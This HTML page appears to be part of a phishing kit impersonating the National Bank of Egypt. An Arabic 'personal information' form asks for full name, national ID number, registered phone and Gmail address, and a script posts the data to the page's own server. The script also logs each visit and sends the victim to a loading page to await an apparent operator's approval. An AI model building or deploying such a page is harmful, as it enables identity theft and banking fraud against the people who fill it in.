<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>البنك الأهلي - المعلومات الشخصية</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="login-theme.css">
    <style>
        /* Specific styles for personal_info page */
        .form-container-wrapper { max-width: 600px; margin: 40px auto; padding: 0 15px; width: 100%; flex: 1; }
        .form-box { background: #ffffff; border-radius: 12px; padding: 30px 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #eee; }
        .form-title { font-size: 22px; color: #1a1a1a; font-weight: 800; margin-bottom: 25px; text-align: center; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 14px; color: #333; font-weight: bold; margin-bottom: 8px; }
        .form-control { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; outline: none; }
        .dropdown-container { display: flex; gap: 10px; }
        .phone-input-wrapper { display: flex; align-items: center; background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 0 10px; }
        .country-code { display: flex; align-items: center; gap: 5px; color: #666; font-size: 14px; border-left: 1px solid #eee; padding-left: 10px; margin-left: 10px; }
        .phone-control { border: none !important; padding: 12px 0 !important; }
        .submit-btn { background-color: #0b6b4f; color: white; border: none; width: 100%; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>

<header class="site-header">
    <div class="header-right">
        <img src="static_nbe_logo_full.png" alt="البنك الأهلي المصري">
    </div>
    <div class="header-left">
        <a href="personal_info_en.html" class="lang-switcher">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
            <span>English</span>
        </a>
    </div>
</header>

<div class="form-container-wrapper">
    <div class="form-box">
        <h2 class="form-title">المعلومات الشخصية</h2>
        <form id="personalInfoForm">
            <div class="form-group">
                <label for="fullName">الاسم بالكامل</label>
                <input type="text" id="fullName" name="fullName" class="form-control" placeholder="أدخل اسمك بالكامل" required>
            </div>
            <div class="form-group">
                <label for="nationalId">الرقم القومي</label>
                <input type="text" id="nationalId" name="nationalId" class="form-control" placeholder="أدخل الرقم القومي" maxlength="14" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
            </div>
            <div class="form-group">
                <label for="phone">رقم الهاتف المسجل</label>
                <div class="phone-input-wrapper" dir="ltr">
                    <span class="country-code">🇪🇬 +20</span>
                    <input type="tel" id="phone" name="phone" class="form-control phone-control" placeholder="رقم الهاتف" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                </div>
            </div>
            <div class="form-group">
                <label for="email">بريد جيميل (Gmail)</label>
                <input type="email" id="email" name="email" class="form-control" placeholder="أدخل بريد جيميل الخاص بك" required>
            </div>
            <div id="errorMessage" style="color: red; text-align: center; margin-bottom: 15px; display: none;"></div>
            <button type="submit" class="submit-btn">متابعة الطلب</button>
        </form>
    </div>
</div>

<script>
    fetch("/track_visit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "track_visit", page: "personal_info" })
    }).catch(error => console.error("Error tracking visit:", error));

    document.getElementById("personalInfoForm").addEventListener("submit", async function(event) {
        event.preventDefault();
        const formData = new FormData(this);
        const data = Object.fromEntries(formData.entries());
        
        try {
            const response = await fetch("/submit_request", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ type: "personal_info", data: data })
            });
            const result = await response.json();
            if (result.status === "approved" || result.status === "pending") {
                localStorage.setItem("request_id", result.request_id);
                window.location.href = "loading.html?request_id=" + result.request_id;
            }
        } catch (e) { console.error(e); }
    });
</script>
</body>
</html>
